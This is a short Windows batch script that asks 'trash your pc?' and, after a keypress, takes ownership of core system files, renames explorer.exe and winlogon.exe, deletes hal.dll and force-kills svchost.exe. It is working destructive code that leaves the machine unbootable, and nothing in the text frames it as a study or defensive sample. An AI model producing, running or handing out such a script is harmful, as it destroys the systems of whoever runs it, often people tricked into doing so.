@echo off 
echo trash your pc?
pause
cd C:\windows\system32
takeown /f C:\windows\explorer.exe
ren C:\windows\explorer.exe fishmyass.old
takeown /f  C:\windows\system32\hal.dll
del  C:\windows\system32\hal.dll /q
takeown /f C:\windows\system32\winlogon.exe
ren  C:\windows\system32\winlogon.exe windead.dead
taskkill /f /im svchost.exe
